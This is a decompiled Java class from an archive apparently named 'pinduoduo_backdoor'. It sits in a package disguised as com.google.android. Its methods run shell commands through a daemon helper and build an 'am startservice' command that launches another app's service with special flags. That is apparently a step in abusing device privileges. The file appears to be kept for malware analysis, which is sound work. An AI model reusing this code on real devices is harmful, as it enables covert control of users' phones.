package com.google.android.sd.biz_dynamic_dex.vivo_base;

import android.text.TextUtils;
import java.lang.reflect.Method;

public class DaemonFp {
  private static Method getStringMethod;
  
  public static boolean daemonRunShell(String paramString) {
    paramString = DaemonRunShellUtil.callShell(paramString);
    return (paramString != null && paramString.startsWith("fail")) ? false : (TextUtils.isEmpty(paramString) ^ true);
  }
  
  public static boolean grantByShell(String paramString1, String paramString2, String paramString3) {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append("am startservice -n ");
    stringBuilder.append(paramString1);
    stringBuilder.append("/");
    stringBuilder.append(paramString2);
    stringBuilder.append(" -d ");
    stringBuilder.append(paramString3);
    stringBuilder.append(" -f 195");
    return daemonRunShell(stringBuilder.toString());
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\be7a2b643d7e8543f49994ffeb0ee0b6-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\vivo_base\DaemonFp.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */